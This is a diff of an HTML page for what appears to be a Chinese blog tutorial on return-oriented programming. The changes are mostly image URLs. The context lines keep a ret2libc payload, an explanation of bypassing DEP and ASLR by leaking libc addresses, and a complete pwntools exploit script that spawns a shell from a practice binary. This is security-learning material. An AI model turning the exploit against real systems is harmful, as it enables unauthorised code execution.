@@ -99,15 +99,15 @@
 <meta property="og:url" content="http://yoursite.com/2017/05/07/PWN 学习之 ROP篇/index.html">
 <meta property="og:site_name" content="L">
 <meta property="og:description" content="一 、序ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。参考文章">
-<meta property="og:image" content="http://yoursite.com/2017/05/07/PWN%20学习之%20ROP篇/images/14940916866912/14941651361767.png">
-<meta property="og:image" content="http://yoursite.com/2017/05/07/PWN%20学习之%20ROP篇/images/14940916866912/14941652944059.png">
-<meta property="og:image" content="http://yoursite.com/2017/05/07/PWN%20学习之%20ROP篇/images/14940916866912/14941654146332.png">
-<meta property="og:image" content="http://yoursite.com/2017/05/07/PWN%20学习之%20ROP篇/images/14940916866912/14941748383625.png">
-<meta property="og:updated_time" content="2017-06-03T16:39:50.000Z">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/06/04/59330814a0ef7.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/06/04/59330818057a3.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/06/04/59330817e33ff.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/06/04/593308118de6b.png">
+<meta property="og:updated_time" content="2017-06-03T19:06:16.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PWN 学习之 ROP篇">
 <meta name="twitter:description" content="一 、序ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。参考文章">
-<meta name="twitter:image" content="http://yoursite.com/2017/05/07/PWN%20学习之%20ROP篇/images/14940916866912/14941651361767.png">
+<meta name="twitter:image" content="https://ooo.0o0.ooo/2017/06/04/59330814a0ef7.png">
 
 
 
@@ -390,15 +390,15 @@
 <p>找到了system的地址，“/bin/sh”的地址，我们就能构造如下的shellcode。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload=&apos;A&apos;*n+p32(system_addr)+p32(ret)+p32(binsh_addr)</div></pre></td></tr></table></figure>
 <p><strong>要注意的是system()后面跟的是执行完system函数后要返回地址，接下来才是”/bin/sh”字符串的地址。因为我们执行完后也不打算干别的什么事，所以我们就可以随便写一个4字节的ret来填充.</strong></p>
-<h4 id="3、ROP-ByPass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><a href="#3、ROP-ByPass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护" class="headerlink" title="3、ROP-ByPass DEP and ASLR 通过ROP绕过DEP和ASLR防护"></a>3、ROP-ByPass DEP and ASLR 通过ROP绕过DEP和ASLR防护</h4><p>因为开启了ASLR，所以每次libc.so的加载地址都是变化的，这个时候我们就需要先解决这个问题，然后才能利用ret2libc的方法得到shell.<br>思路是：我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。既然栈，libc，heap的地址都是随机的。我们怎么才能泄露出libc.so的地址呢？方法还是有的，因为程序本身在内存中的地址并不是随机的，如图所示：<br><img src="images/14940916866912/14941651361767.png" alt=""></p>
-<p>我们发现除了程序本身的实现的函数之外，我们还可以使用read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书）<br>因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。<br>使用ldd命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址。<br>攻击流程图如下：<br><img src="images/14940916866912/14941652944059.png" alt=""></p>
+<h4 id="3、ROP-ByPass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><a href="#3、ROP-ByPass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护" class="headerlink" title="3、ROP-ByPass DEP and ASLR 通过ROP绕过DEP和ASLR防护"></a>3、ROP-ByPass DEP and ASLR 通过ROP绕过DEP和ASLR防护</h4><p>因为开启了ASLR，所以每次libc.so的加载地址都是变化的，这个时候我们就需要先解决这个问题，然后才能利用ret2libc的方法得到shell.<br>思路是：我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。既然栈，libc，heap的地址都是随机的。我们怎么才能泄露出libc.so的地址呢？方法还是有的，因为程序本身在内存中的地址并不是随机的，如图所示：<br><img src="https://ooo.0o0.ooo/2017/06/04/59330814a0ef7.png" alt="14941651361767.png"></p>
+<p>我们发现除了程序本身的实现的函数之外，我们还可以使用read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书）<br>因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。<br>使用ldd命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址。<br>攻击流程图如下：<br><img src="https://ooo.0o0.ooo/2017/06/04/59330818057a3.png" alt="14941652944059.png"></p>
 <p>通过write函数将地址泄露出去。</p>
 <hr>
-<p>在write执行完成后需要二次溢出，所以我们在write执行完后需要调用原函数一次。栈空间分布如下图：<br><img src="images/14940916866912/14941654146332.png" alt=""></p>
+<p>在write执行完成后需要二次溢出，所以我们在write执行完后需要调用原函数一次。栈空间分布如下图：<br><img src="https://ooo.0o0.ooo/2017/06/04/59330817e33ff.png" alt="14941654146332.png"></p>
 <p>最后通过ret2libc执行我们最终的 system(“/bin/sh”)</p>
 <h4 id="leak-得到函数的泄露地址"><a href="#leak-得到函数的泄露地址" class="headerlink" title="leak 得到函数的泄露地址"></a>leak 得到函数的泄露地址</h4><p>上面绕过ASLR我们需要libc.so来计算system 等数据的地址。当往往我们并没有对方的libc.so。这意味我们无法直接得到函数地址。此时我们需要pwntools提供的DynELF,构造一个leak,不停的去读写libc，找到我们需要的函数地址，代码如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env pythonfrom pwn import *p = process(&apos;./level2&apos;)elf = ELF(&apos;level2&apos;)#p = remote(&apos;127.0.0.1&apos;, 10003)plt_write= elf.symbols[&apos;write&apos;]plt_read  = elf.symbols[&apos;read&apos;]print &apos;plt_write= &apos; + hex(plt_write)print &apos;plr_read= &apos;+hex(plt_read)vulfun_addr = 0x8048436print &apos;vulfun= &apos; + hex(vulfun_addr)main_addr=elf.symbols[&apos;main&apos;]def leak(address):	payload=&quot;A&quot;*140+p32(plt_write)+p32(main_addr)+p32(1)+p32(address)+p32(4)	p.sendline(payload)	data=p.recv(4)	log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;)))	return dataprint recvline()dynelf=DynELF(leak,elf=ELF(&quot;level2&quot;))systemAddress=dynelf.lookup(&apos;system&apos;,&apos;libc&apos;)print &quot;systemAddress: &quot;,hex(systemAddress)bss_addr=elf.symbols[&apos;__bss_start&apos;]print &quot;bss_addr: &quot;,hex(bss_addr)pop_addr=0x80484bdpayload1=&quot;A&quot;*140+p32(plt_read)+p32(pop_addr)+p32(0)+p32(bss_addr)+p32(8)payload1+=p32(systemAddress)+p32(vulfun_addr)+p32(bss_addr)p.sendline(payload1)p.sendline(&quot;/bin/sh\0&quot;)p.interactive()</div></pre></td></tr></table></figure>
-<p>效果图：<br><img src="images/14940916866912/14941748383625.png" alt=""></p>
+<p>效果图：<br><img src="https://ooo.0o0.ooo/2017/06/04/593308118de6b.png" alt="14941748383625.png"></p>
 
       
     </div>
